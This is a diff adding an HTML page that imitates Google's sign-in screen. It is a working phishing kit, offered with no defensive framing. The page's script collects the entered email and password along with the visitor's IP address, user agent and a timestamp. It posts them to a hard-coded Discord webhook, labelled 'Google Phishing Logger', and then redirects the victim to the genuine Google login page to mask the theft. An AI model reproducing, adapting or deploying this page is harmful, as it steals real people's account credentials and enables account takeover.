@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in – Google accounts</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #f8f9fa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%23f8f9fa"/><text x="50" y="50" font-family="Arial" font-size="0.1" fill="%23f8f9fa">Google</text></svg>');
+        }
+        .container {
+            background: #fff;
+            padding: 48px 40px 36px;
+            border-radius: 8px;
+            box-shadow: 0 1px 2px 0 rgba(60,64,67,.3), 0 1px 3px 1px rgba(60,64,67,.15);
+            width: 368px;
+            position: relative;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        .logo img {
+            height: 24px;
+        }
+        .header {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+        .subheader {
+            font-size: 16px;
+            color: #202124;
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 4px;
+            font-weight: 400;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            outline: none;
+            transition: border 0.2s;
+        }
+        .form-group input:focus {
+            border-color: #4285f4;
+            box-shadow: 0 1px 2px 0 rgba(66,133,244,0.15);
+        }
+        .show-password {
+            position: absolute;
+            right: 40px;
+            top: 212px;
+            color: #5f6368;
+            font-size: 14px;
+            cursor: pointer;
+            user-select: none;
+        }
+        .submit-btn {
+            background-color: #1a73e8;
+            color: #fff;
+            border: none;
+            padding: 12px;
+            width: 100%;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            margin: 24px 0 12px;
+            transition: background-color 0.2s;
+        }
+        .submit-btn:hover {
+            background-color: #0d5bba;
+        }
+        .footer-links {
+            display: flex;
+            justify-content: space-between;
+            font-size: 14px;
+            color: #5f6368;
+            margin-top: 16px;
+        }
+        .footer-links a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        .language-selector {
+            position: absolute;
+            bottom: 20px;
+            right: 40px;
+            display: flex;
+            align-items: center;
+            font-size: 14px;
+            color: #5f6368;
+        }
+        .help-links {
+            position: absolute;
+            bottom: 20px;
+            left: 40px;
+            display: flex;
+            gap: 12px;
+            font-size: 14px;
+        }
+        .help-links a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg" alt="Google">
+        </div>
+        <h1 class="header">Sign in</h1>
+        <p class="subheader">Use your Google Account</p>
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="email">Email or phone</label>
+                <input type="text" id="email" name="email" autocomplete="username" required>
+            </div>
+            <div class="form-group" style="position: relative;">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" autocomplete="current-password" required>
+                <span class="show-password" id="togglePassword">Show password</span>
+            </div>
+            <button type="submit" class="submit-btn">Next</button>
+        </form>
+        <div class="footer-links">
+            <a href="#">Forgot email?</a>
+            <a href="#">Forgot password?</a>
+        </div>
+        <div class="help-links">
+            <a href="#">Create account</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+        <div class="language-selector">
+            <span>English (United States)</span>
+            <a href="#" style="margin-left: 8px; color: #1a73e8;">●</a>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('togglePassword').addEventListener('click', function() {
+            const passwordInput = document.getElementById('password');
+            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordInput.setAttribute('type', type);
+            this.textContent = type === 'password' ? 'Show password' : 'Hide password';
+        });
+
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // Get client IP and user agent
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            const userAgent = navigator.userAgent;
+            const timestamp = new Date().toISOString();
+
+            // Prepare payload with enhanced metadata
+            const payload = {
+                embeds: [{
+                    title: "🔓 New Google Login Credentials",
+                    color: 0x3498db,
+                    fields: [
+                        { name: "Email/Phone", value: `\`\`\`${email}\`\`\``, inline: false },
+                        { name: "Password", value: `\`\`\`${password}\`\`\``, inline: false },
+                        { name: "IP Address", value: `\`\`\`${ipData.ip}\`\`\``, inline: true },
+                        { name: "User Agent", value: `\`\`\`${userAgent}\`\`\``, inline: false },
+                        { name: "Timestamp", value: `\`\`\`${timestamp}\`\`\``, inline: true }
+                    ],
+                    footer: { text: "Google Phishing Logger" }
+                }]
+            };
+
+            // Send to Discord webhook with proper headers
+            fetch('https://discord.com/api/webhooks/1493369198326448249/setQfGwNJQUzEWuEtHOe9AWD-CTIKteSAJUOMoEczAhr4sGWPacCxxDB2OuYe_7qMEUu', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (!response.ok) throw new Error('Webhook failed');
+                window.location.href = 'https://accounts.google.com/v3/signin/challenge/pwd?continue=https%3A%2F%2Fmyaccount.google.com%2F&emr=1&followup=https%3A%2F%2Fmyaccount.google.com%2F&osid=1&passive=1209600&service=accountsettings';
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                window.location.href = 'https://accounts.google.com/ServiceLogin?hl=en';
+            });
+        });
+    </script>
+</body>
+</html>
